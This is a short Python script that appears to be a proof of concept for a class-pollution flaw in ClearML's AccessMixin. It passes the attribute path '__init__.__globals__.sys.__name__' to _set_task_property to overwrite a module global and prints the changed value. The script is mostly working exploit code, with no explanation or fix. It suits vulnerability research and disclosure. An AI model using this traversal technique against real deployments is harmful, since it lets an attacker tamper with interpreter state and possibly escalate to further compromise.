from clearml.backend_interface.task.access import AccessMixin
import sys

class Animal:
  def __init__(self, typ, age):
      self.type = typ
      self.age = age

obj = Animal('cat', 11)

class MyAccessMixin(AccessMixin):
    session = None
    data = obj
    cache_dir = "/tmp/cache"
    log = None 

mixin_instance = MyAccessMixin()

prop_path = '__init__.__globals__.sys.__name__'
payload = 'polluted'
a = mixin_instance._set_task_property(prop_path, payload)
print(sys.__name__)
